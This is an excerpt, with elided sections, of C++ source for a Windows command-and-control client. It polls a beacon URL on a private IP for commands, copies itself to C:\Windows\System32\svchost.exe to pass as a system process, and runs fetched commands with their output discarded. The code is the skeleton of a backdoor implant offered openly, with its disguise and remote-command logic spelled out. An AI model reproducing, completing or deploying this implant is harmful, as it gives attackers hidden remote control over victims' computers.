// g++ -o client.exe client.cpp -lcurl
#include <iostream>
#include <curl/curl.h>
#include <filesystem>
#include <curl/easy.h>
...
#define SHELLURL "http://10.0.0.109:8080/beacon/getcmd/windows"
#define PORT 8080

std::string find(){
    char execpath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, execpath, MAX_PATH);
...
void move(){
    ...
    std::string newpath = "C:\\Windows\\System32\\svchost.exe";
    if (prev != newpath){
...
int pullcmd(CURL *curl) {
    ...
    if(!cmd.empty()) {
        std::string cmdlogdrop = cmd + " > nul 2>&1";
